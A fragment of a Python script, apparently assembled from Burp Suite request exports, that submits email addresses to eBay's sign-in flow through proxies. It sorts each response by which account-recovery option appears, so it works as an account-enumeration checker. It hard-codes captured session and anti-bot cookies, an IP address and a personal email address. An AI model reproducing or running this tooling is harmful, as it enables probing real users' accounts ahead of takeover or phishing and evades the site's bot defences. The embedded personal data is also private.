    burp0_cookies = {"ak_bmsc": "E21D28F53EFBE3675A1BE677EC75BC375C7B49F02E1A0000AE25FA5F7BB42B28~plMYBLB13Yq1GE9h2ZpNNP1hbm1FQDYuhJGosaOM+C/yeaA+XxDiQC6JFhkE3nCUA2S8N42KEZBE9HRxDBobGzHR5tLuKKljdgvr3rJGzfa7PaYSCkPgkliKZhPDdt3N+tOqvVHhdPatowV7388qO06LE2S7vlIRcV4LS+GKT6QtuWGG86TKFb2/kGAWYMq5HR5QPkBpOoF6diWwk3acRpRKIwbBrX9htfqqsCUPcL1s8=", "s": "CgAD4ACBf+3dGZTkyMzMxN2YxNzYwYWFkYmM3OTFiOTJmZmZmNjRlZGbAX5PJ", "DG_SID": "196.89.20.208:++b6URJ4KtPMpVZgInDI9XvT+DVsk0/0tMQK63n043c", "bm_sv": "4C4D10E80945A79EAED832CD53003F7F~m7z76F5WtOkdEjs+JZI4ljie1D2FRR76qD/uzfuKLHqyo9BJzgP2W0h6zC9cYdhA4/pB9es/NQHwsmNZxH/Afelm4WmoikNrmdT5dr8yBsKen35/Gld7herBWBLGhOMPYMirOVAWaPNMNOFvTe2CWA==", "ebay": "%5Ejs%3D1%5Esbf%3D%23000000%5E", "cid": "J5I9damnkLEByjZB%232108961104", "__uzma": "521bce73-748d-4184-b727-33796dc57869", "__uzmb": "1610229380", "__ssds": "2", "__ssuzjsr2": "a9be0cd8e", "__uzmaj2": "d4005324-5ec0-4a97-9467-b9524399a373", "__uzmbj2": "1610229398", "__uzmcj2": "203991074450", "__uzmdj2": "1610229398", "DG_IID": "97750E56-EC30-361E-817B-0ED083CCDB98", "DG_UID": "49D2E6ED-495E-397C-B5DF-942BD69A2E21", "DG_ZID": "96693A6C-49FC-31FA-B23B-0D5CAFBCAB30", "DG_ZUID": "04570211-45A3-348B-A47D-9D107F8B615B", "DG_HID": "51C02209-741A-3295-92C3-6A5863F8C47B", "dp1": "bu1p/QEBfX0BAX19AQA**63bc8daa^pbf/%232000000000000000000000000000461db5a2a^tzo/1a45ffa3494^bl/MAen-US63bc8daa^", "nonsession": "BAQAAAXYrDFi8AAaAADMABWHbWio4MDAwMADKACBjvI2qZTkyMzMxN2YxNzYwYWFkYmM3OTFiOTJmZmZmNjRlZGYAywABX/otsjUSl+ZhpPeJXZ9l5WDB4KsxVt2igw**", "npii": "btguid/e923317f1760aadbc791b92ffff64edf63bc8daa^cguid/e92392691760ac0f6472675df787691063bc8daa^", "__uzmc": "803741319585", "__uzmd": "1610229418", "__uzme": "6583"}
    burp0_headers = {"Connection": "close", "Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "Origin": "https://signin.ebay.com", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Referer": "https://signin.ebay.com/ws/eBayISAPI.dll?SignIn&ru=https%3A%2F%2Fwww.ebay.com%2F", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9"}
    burp0_data = {"input": "byto.faouzi@gmail.com", "type": "USERNAME", "srt": "010005000000500bcc70d37c41aa37f957053b0c5323124b1e2b309ef86031d755c0a775864c61ffad49285522eed01569001cef948be028e35104479ea42f9785658db757cc0dd4f5ab09e9dc32c7e70782485eb1c24c", "kmsi": "true"}
    burp0_data['input'] = email
    r =requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data,proxies={"https" : "https://"+proxy})
    burp0_url = r.url
    burp0_cookies = {"ak_bmsc": "E21D28F53EFBE3675A1BE677EC75BC375C7B49F02E1A0000AE25FA5F7BB42B28~plMYBLB13Yq1GE9h2ZpNNP1hbm1FQDYuhJGosaOM+C/yeaA+XxDiQC6JFhkE3nCUA2S8N42KEZBE9HRxDBobGzHR5tLuKKljdgvr3rJGzfa7PaYSCkPgkliKZhPDdt3N+tOqvVHhdPatowV7388qO06LE2S7vlIRcV4LS+GKT6QtuWGG86TKFb2/kGAWYMq5HR5QPkBpOoF6diWwk3acRpRKIwbBrX9htfqqsCUPcL1s8=", "s": "CgAD4ACBf+3dGZTkyMzMxN2YxNzYwYWFkYmM3OTFiOTJmZmZmNjRlZGbAX5PJ", "DG_SID": "196.89.20.208:++b6URJ4KtPMpVZgInDI9XvT+DVsk0/0tMQK63n043c", "bm_sv": "4C4D10E80945A79EAED832CD53003F7F~m7z76F5WtOkdEjs+JZI4ljie1D2FRR76qD/uzfuKLHqyo9BJzgP2W0h6zC9cYdhA4/pB9es/NQHwsmNZxH/Afelm4WmoikNrmdT5dr8yBsKen35/Gld7herBWBLGhOMPYMirOVAWaPNMNOFvTe2CWA==", "ebay": "%5Ejs%3D1%5Esbf%3D%23000000%5E", "cid": "J5I9damnkLEByjZB%232108961104", "__uzma": "521bce73-748d-4184-b727-33796dc57869", "__uzmb": "1610229380", "__ssds": "2", "__ssuzjsr2": "a9be0cd8e", "__uzmaj2": "d4005324-5ec0-4a97-9467-b9524399a373", "__uzmbj2": "1610229398", "__uzmcj2": "203991074450", "__uzmdj2": "1610229398", "DG_IID": "97750E56-EC30-361E-817B-0ED083CCDB98", "DG_UID": "49D2E6ED-495E-397C-B5DF-942BD69A2E21", "DG_ZID": "96693A6C-49FC-31FA-B23B-0D5CAFBCAB30", "DG_ZUID": "04570211-45A3-348B-A47D-9D107F8B615B", "DG_HID": "51C02209-741A-3295-92C3-6A5863F8C47B", "__uzme": "6583", "dp1": "bu1p/QEBfX0BAX19AQA**63bc8db5^pbf/%232000000000000000000000000000461db5a35^tzo/1a45ffa3494^bl/MAen-US63bc8db5^", "nonsession": "BAQAAAXYrDFi8AAaAADMABWHbWjU4MDAwMADKACBjvI21ZTkyMzMxN2YxNzYwYWFkYmM3OTFiOTJmZmZmNjRlZGYAywABX/otvTaAHWGIdXv2FJ2sBPbh7fwgwagjww**", "npii": "btguid/e923317f1760aadbc791b92ffff64edf63bc8db5^cguid/e92392691760ac0f6472675df787691063bc8db5^", "__uzmc": "577281638280", "__uzmd": "1610229429"}
    burp0_headers = {"Connection": "close", "Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Sec-Fetch-Site": "same-site", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Referer": "https://signin.ebay.com/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9"}
    try:
        r = requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,proxies={"https" : "https://"+proxy})
        if -1 != r.__dict__['_content'].decode("utf-8").find("email-desc"):
            return ("email option ------- :")
        elif  -1 != r.__dict__['_content'].decode("utf-8").find("text-desc"):
            return ("text only ------- :")
    except:
        return("sus ------- :")

check()


